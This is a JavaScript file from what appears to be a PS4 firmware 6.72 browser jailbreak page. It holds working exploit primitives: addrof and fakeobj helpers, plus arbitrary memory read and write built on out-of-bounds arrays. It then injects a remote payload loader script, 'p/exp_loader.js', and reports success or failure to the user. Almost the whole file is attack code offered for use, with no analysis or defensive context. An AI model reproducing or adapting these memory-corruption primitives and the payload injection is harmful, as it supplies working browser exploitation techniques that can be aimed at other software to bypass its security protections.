function jailbreak(){
function addrof(x) {leaker_obj.a = x;return i48_get(leaker_arr);}function fakeobj(x) {i48_put(x, leaker_arr);return leaker_obj.a;}function read_mem_setup(p, sz) {i48_put(p, oob_master);oob_master[6] = sz;}function read_mem(p, sz) {read_mem_setup(p, sz);var arr = [];for (var i = 0; i < sz; i++)arr.push(oob_slave[i]);return arr;}function read_mem_s(p, sz) {read_mem_setup(p, sz);return "" + oob_slave;}function read_mem_b(p, sz) {read_mem_setup(p, sz);var b = new Uint8Array(sz);b.set(oob_slave);return b;}function read_mem_as_string(p, sz) {var x = read_mem_b(p, sz);var ans = '';for (var i = 0; i < x.length; i++)ans += String.fromCharCode(x[i]);return ans;}function write_mem(p, data) {i48_put(p, oob_master);oob_master[6] = data.length;for (var i = 0; i < data.length; i++)oob_slave[i] = data[i];}function read_ptr_at(p) {var ans = 0;var d = read_mem(p, 8);for (var i = 7; i >= 0; i--)ans = 256 * ans + d[i];return ans;}function write_ptr_at(p, d) {var arr = [];for (var i = 0; i < 8; i++) {arr.push(d & 0xff);d /= 256;}write_mem(p, arr);}
if (main_ret == 179 || main_ret == 0){
var userAgent = navigator.userAgent;
if (userAgent.indexOf("PlayStation 4 6.72") != -1) {
localStorage.passcount = ++localStorage.passcount;window.passCounter.innerHTML=localStorage.passcount;
txt1.innerHTML="Exploit Loaded ✔ Loading Payload...";
var script = document.createElement('script');script.src = "p/exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);
	}
	else{
txt1.innerHTML="Exploit Loaded ✔ Loading Payload...";
var script = document.createElement('script');script.src = "p/exp_loader.js";document.getElementsByTagName('head')[0].appendChild(script);
	}
	}
else{
localStorage.failcount = ++localStorage.failcount;window.failCounter.innerHTML=localStorage.failcount;
txt1.innerHTML="Jailbreak failed! - Reboot your PS4 and try again";
}
}